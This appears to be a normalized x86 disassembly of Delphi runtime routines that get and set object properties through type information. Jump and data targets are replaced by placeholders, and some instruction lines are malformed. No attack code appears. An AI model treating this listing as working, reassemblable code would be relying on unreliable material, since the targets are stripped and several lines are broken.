pop ecx
pop ebp
retn 0x10
jmp r-xdata
sub_416550
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_416804
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ r-xdata ]
mov edx esi
mov eax edi
call sub_41623c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168b0
mov esi eax
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_416210
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax ]
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
jmp [ eax * 4 + jump_table_4165bf ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41680b
lea eax [ ebp - 0x18 ]
call sub_4046b0
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc8
retn
mov eax [ esi + 0x5 ]
cmp eax [ esi + 0x1 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_414198
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_414198
cmp ax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_411ad0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax edi
call sub_4173fc
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4141e0
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax edi
call sub_4170fc
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_414224
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax edi
call sub_417210
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_417648
jmp r-xdata
push ebp
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
call sub_4164e8
pop ecx
push edx
push eax
mov edx ebx
mov eax edi
call sub_4176e8
jmp r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_414cd8
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x5 ]
xor edx edx
push edx
push eax
call sub_4164e8
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_4164e8
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_414198
cmp ax 0xb
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4141e0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_416be0
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4141e0
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax edi
call sub_416e60
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410180
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_4164e8
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_411ad0
call sub_402a30
test edx edx
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
jmp r-xdata
neg eax
adc edx 0x0
neg edx
sub_416818
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416873
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov cl 0x1
mov edx [ ebp + 0x8 ]
call sub_41627c
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f878
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41687a
lea eax [ ebp - 0x10 ]
call sub_40f564
retn
sub_416888
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_416550
mov al 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4168bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41697a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_4168b0
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_4168b0
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408408
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403ff8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4081d4
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416981
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4080f4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403ff8
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404208
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_416994
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4169e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4168b0
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408544
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416994
mov edx [ rw-data ]
mov eax esi
call sub_4081d4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_4081d4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408544
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_416a44
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_416ab4
push ebx
push ecx
mov [ esp ] ecx
call sub_416a44
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov eax [ r-xdata ]
cmp eax [ esp ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
cmp al 0x1f
ja r-xdata
jb r-xdata
and eax 0x7f
bt [ esp ] eax
xor ebx ebx
sub_416aec
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_416b60
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_416bbc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_416aec
mov edx eax
mov ecx edi
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168bc
pop edi
pop esi
pop ebx
retn
sub_416be0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
mov edx esi
call sub_4169e0
test eax eax
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_416b60
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
sub_416c30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_416aec
mov edx eax
mov ecx ebx
mov eax edi
call sub_416c5c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_416c5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416d10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa4
mov eax [ ebp - 0x4 ]
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168b0
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
xor ebx ebx
jae r-xdata
bt edi eax
inc ebx
cmp ebx 0x20
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax ebx
cmp eax 0x1f
ja r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4168bc
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40426c
mov eax esi
mov edx r-xdata
call sub_40426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d17
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
push r-xdata
push [ esi ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_404324
sub_416d44
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
test al al
je r-xdata
mov eax edx
mov edx [ esi ]
mov ecx ebx
call sub_404094
jmp r-xdata
sub al 0x20
je r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
sub al 0x20
je r-xdata
sub al 0xc
je r-xdata
inc ebx
sub al 0xc
je r-xdata
sub al 0x31
jne r-xdata
sub al 0x31
je r-xdata
inc ebx
add [ esi ] ebx
pop esi
pop ebx
retn
sub_416d88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416e4f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e56
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax edi
call sub_404464
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x20
je r-xdata
inc [ ebp - 0x4 ]
sub al 0x3b
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168b0
mov eax [ eax + 0x1 ]
mov edi [ eax ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416d44
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4169e0
mov ebx eax
test ebx ebx
jge r-xdata
cmp ebx 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416d44
bts esi ebx
sub_416e60
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx edi
mov eax ebx
call sub_416d88
mov ecx eax
mov edx ebx
mov eax esi
call sub_416b60
pop edi
pop esi
pop ebx
retn
sub_416e84
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_416ec8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416f44
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404240
mov ecx esp
mov edx esi
mov eax ebx
call sub_416ec8
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_416f8c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_416f78
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_416fcc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_416f78
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41700c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417054
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_417128
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40422c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41705b
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_417064
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4170ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047fc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_417210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4170b3
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_4170bc
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416f1c
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416f8c
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_41700c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403fa4
pop ebx
retn
sub_4170fc
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_416f44
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_416fcc
pop ebx
retn
dec bl
je r-xdata
call sub_417064
jmp r-xdata
pop ebx
retn
sub_417128
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_417200
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_4170bc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4047fc
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417207
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4046ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046b0
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_417210
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4172d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_40422c
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4170fc
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4172dd
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046ec
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4172e4
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168b0
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_417324 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_4168b0
cmp [ eax ] 0x4
jne r-xdata
sub_4173fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4168b0
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_417444 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_417573 ]
jmp [ eax * 4 + jump_table_4174e0 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_417608
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4175f4
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_417648
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4175f4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_417688
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4176c0
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4176e8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
